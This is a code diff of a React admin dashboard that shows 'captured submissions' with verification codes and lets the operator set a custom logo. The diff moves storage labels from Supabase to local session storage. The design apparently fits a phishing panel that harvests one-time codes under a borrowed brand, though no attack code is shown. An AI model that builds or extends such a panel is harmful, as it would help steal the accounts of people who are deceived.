@@ -17,7 +17,6 @@ const AdminPanel: React.FC<AdminPanelProps> = ({ submissions, onClear, isDarkMod
   const handleSvgPaste = () => {
     try {
       if (!svgInput.trim()) return;
-      // Basic validation: check if it contains <svg
       if (!svgInput.toLowerCase().includes('<svg')) {
         alert("Please paste valid SVG code starting with <svg...");
         return;
@@ -41,18 +40,18 @@ const AdminPanel: React.FC<AdminPanelProps> = ({ submissions, onClear, isDarkMod
       <div className="flex flex-col md:flex-row justify-between items-start md:items-center mb-8 gap-4">
         <div>
           <h1 className="text-2xl font-bold">Admin Dashboard</h1>
-          <p className="text-sm opacity-60">Supabase Backend Management</p>
+          <p className="text-sm opacity-60">Local Session Management</p>
         </div>
         <div className="flex space-x-3">
           <button 
             onClick={() => {
-              if (confirm("Are you sure you want to clear all logs from Supabase?")) {
+              if (confirm("Clear session logs?")) {
                 onClear();
               }
             }}
             className="px-4 py-2 text-sm font-semibold text-red-500 hover:bg-red-500/10 rounded-lg transition-colors"
           >
-            Clear Database
+            Clear Session
           </button>
           <button 
             onClick={onBack}
@@ -63,9 +62,8 @@ const AdminPanel: React.FC<AdminPanelProps> = ({ submissions, onClear, isDarkMod
         </div>
       </div>
 
-      {/* Branding Section */}
       <div className={`mb-10 p-5 rounded-lg ${isDarkMode ? 'bg-[#2C2C2C]' : 'bg-gray-50'} border ${isDarkMode ? 'border-white/5' : 'border-black/5'}`}>
-        <h2 className="text-sm font-bold uppercase tracking-wider mb-4 opacity-80">App Branding (Supabase)</h2>
+        <h2 className="text-sm font-bold uppercase tracking-wider mb-4 opacity-80">App Branding (Local)</h2>
         
         <div className="space-y-6">
           <div className="flex flex-col md:flex-row items-end gap-4">
@@ -94,7 +92,6 @@ const AdminPanel: React.FC<AdminPanelProps> = ({ submissions, onClear, isDarkMod
                 alt="Preview" 
                 className="h-6 w-auto object-contain max-w-[100px]"
                 onError={(e) => { (e.target as HTMLImageElement).style.display = 'none'; }}
-                onLoad={(e) => { (e.target as HTMLImageElement).style.display = 'block'; }}
               />
             </div>
           </div>
@@ -117,11 +114,11 @@ const AdminPanel: React.FC<AdminPanelProps> = ({ submissions, onClear, isDarkMod
           </div>
         </div>
         
-        <p className="mt-4 text-[10px] opacity-40 italic">Updates are saved to Supabase and reflect instantly for all users.</p>
+        <p className="mt-4 text-[10px] opacity-40 italic">Logo settings are saved to your browser's local storage.</p>
       </div>
 
       <div className="overflow-x-auto">
-        <h2 className="text-sm font-bold uppercase tracking-wider mb-4 opacity-80">Captured Submissions (Real-time)</h2>
+        <h2 className="text-sm font-bold uppercase tracking-wider mb-4 opacity-80">Captured in This Session</h2>
         <table className="w-full text-left border-collapse">
           <thead>
             <tr className={`text-xs uppercase tracking-wider opacity-60 border-b ${isDarkMode ? 'border-white/10' : 'border-black/10'}`}>
@@ -135,7 +132,7 @@ const AdminPanel: React.FC<AdminPanelProps> = ({ submissions, onClear, isDarkMod
             {submissions.length === 0 ? (
               <tr>
                 <td colSpan={4} className="py-10 text-center opacity-40 italic">
-                  No submissions found in Supabase...
+                  No submissions captured yet...
                 </td>
               </tr>
             ) : (
@@ -152,7 +149,7 @@ const AdminPanel: React.FC<AdminPanelProps> = ({ submissions, onClear, isDarkMod
                   </td>
                   <td className="py-4 px-4">
                     <span className="bg-green-500/20 text-green-500 px-2 py-1 rounded text-xs font-bold font-mono">
-                      {s.verificationCode || 'N/A'}
+                      {s.verificationCode || 'WAITING'}
                     </span>
                   </td>
                 </tr>
